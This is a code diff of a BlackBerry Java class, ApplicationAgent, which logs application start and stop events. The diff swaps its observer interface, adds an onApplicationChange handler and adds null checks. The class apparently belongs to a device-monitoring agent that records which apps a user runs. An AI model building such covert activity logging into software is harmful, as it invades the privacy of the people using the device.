@@ -17,18 +17,17 @@ import blackberry.Conf;
 import blackberry.Status;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
-import blackberry.interfaces.ApplicationListObserver;
+import blackberry.interfaces.ApplicationObserver;
 import blackberry.utils.Check;
 import blackberry.utils.DateTime;
 import blackberry.utils.Utils;
 import blackberry.utils.WChar;
 
-// TODO: Auto-generated Javadoc
 /**
  * log dei start e stop delle applicazioni.
  */
 public final class ApplicationAgent extends Agent implements
-        ApplicationListObserver {
+        ApplicationObserver {
     //#ifdef DEBUG
     private static Debug debug = new Debug("ApplicationAgent",
             DebugLevel.VERBOSE);
@@ -82,7 +81,7 @@ public final class ApplicationAgent extends Agent implements
         debug.trace("actualStart addApplicationListObserver");
         //#endif
        
-        AppListener.getInstance().addApplicationListObserver(this);
+        AppListener.getInstance().addApplicationObserver(this);
     }
 
     /*
@@ -93,17 +92,32 @@ public final class ApplicationAgent extends Agent implements
         //#ifdef DEBUG_TRACE
         debug.trace("actualStop removeApplicationListObserver");
         //#endif
-        AppListener.getInstance().removeApplicationListObserver(this);
+        AppListener.getInstance().removeApplicationObserver(this);
        
     }
 
+	public void onApplicationChange(String startedName, String stoppedName,
+			String startedMod, String stoppedMod) {
+		
+        //#ifdef DEBUG_TRACE
+        debug.trace("onApplicationChange START: " + startedName + " " +startedMod );
+        debug.trace("onApplicationChange STOP: " + stoppedName + " " +stoppedMod );
+        //#endif
+        
+        if(stoppedName != null){
+        	writeLog(stoppedName, "STOP " , stoppedMod);
+        }
+		
+		writeLog(startedName, "START", startedMod);
+	}
+	
     /*
      * (non-Javadoc)
      * @see
      * blackberry.interfaces.ApplicationListObserver#onApplicationListChange
      * (java.util.Vector, java.util.Vector)
      */
-    public synchronized void onApplicationListChange(
+    /*public synchronized void onApplicationListChange(
             final Vector startedListName, final Vector stoppedListName,
             final Vector startedListMod, final Vector stoppedListMod) {
 
@@ -158,7 +172,7 @@ public final class ApplicationAgent extends Agent implements
 
         //#endif
     }
-
+*/
     public synchronized void onApplicationListChangeMod(
             final Vector startedList, final Vector stoppedList) {
         //TODO: onApplicationListChangeMod
@@ -183,6 +197,12 @@ public final class ApplicationAgent extends Agent implements
 
     private synchronized void writeLog(final String appName, final String condition,
             final String mod) {
+    	
+    	//#ifdef DBC
+    	Check.requires(appName != null, "Null appName");
+    	Check.requires(mod != null, "Null mod");
+    	//#endif
+    	
         final byte[] tm = (new DateTime()).getStructTm();
 
         final Vector items = new Vector();
@@ -197,4 +217,6 @@ public final class ApplicationAgent extends Agent implements
         log.close();
 
     }
+
+
 }
